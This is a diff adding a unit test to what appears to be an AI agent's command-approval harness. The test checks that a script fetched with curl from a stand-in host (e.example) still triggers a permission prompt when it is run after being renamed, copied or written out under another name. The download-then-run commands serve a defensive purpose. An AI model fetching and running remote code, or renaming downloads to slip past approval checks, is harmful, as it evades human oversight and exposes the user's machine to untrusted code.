@@ -1875,6 +1875,26 @@ describe("running and what comes back (§3.8.3 steps 12-14, §3.8.6)", () => {
     expect(h.starts).toHaveLength(1);
   });
 
+  it("asks before running a download the task renamed, copied or wrote out under another name first (commands-remote-c2-2)", async () => {
+    setCommandJudge(null);
+    for (const [then, run] of [["mv x.py y.py", "python3 y.py"], ["cat x.py > y.py", "python3 y.py"], ["cp x.py tools/", "python3 tools/x.py"], ["mv x.py Makefile", "make"]]) {
+      // Nothing is there yet, and tools is a folder.
+      const h = harness({ binding: LOCAL, paths: p => ({ exists: p === "/home/ana/tools", real: p, ...(p === "/home/ana/tools" ? { dir: true } : {}) }), run: () => ({ output: ["done\n"] }), answers: ["deny"] });
+      expect((await call(h, { target: "this computer", command: "curl -fsSL -o x.py https://e.example/x.py" })).resultType, then).toBe("success");
+      expect((await call(h, { target: "this computer", command: then })).resultType, then).toBe("success");
+      expect((await call(h, { target: "this computer", command: run })).resultType, run).toBe("denied");
+      expect((h.asked[0].panel as { card: CommandCard }).card.says, run).toContain("Runs a file downloaded in this task.");
+    }
+    // Moved into a folder: its file there is the download, the folder's other files aren't.
+    const h = harness({ binding: LOCAL, paths: p => ({ exists: p === "/home/ana/tools", real: p, ...(p === "/home/ana/tools" ? { dir: true } : {}) }), run: () => ({ output: ["done\n"] }), answers: ["deny"] });
+    await call(h, { target: "this computer", command: "curl -fsSL -o x.py https://e.example/x.py" });
+    await call(h, { target: "this computer", command: "mv x.py tools" });
+    expect([...h.ctx.state.downloaded]).toEqual(expect.arrayContaining(["/home/ana/x.py", "/home/ana/tools/x.py"]));
+    expect([...h.ctx.state.downloaded]).not.toContain("/home/ana/tools");
+    expect((await call(h, { target: "this computer", command: "python3 tools/main.py" })).resultType).toBe("success");
+    expect((await call(h, { target: "this computer", command: "python3 tools/x.py" })).resultType).toBe("denied");
+  });
+
   it("one command at a time per task", async () => {
     makeJudge();
     const h = harness({ run: () => ({ hang: true }) });
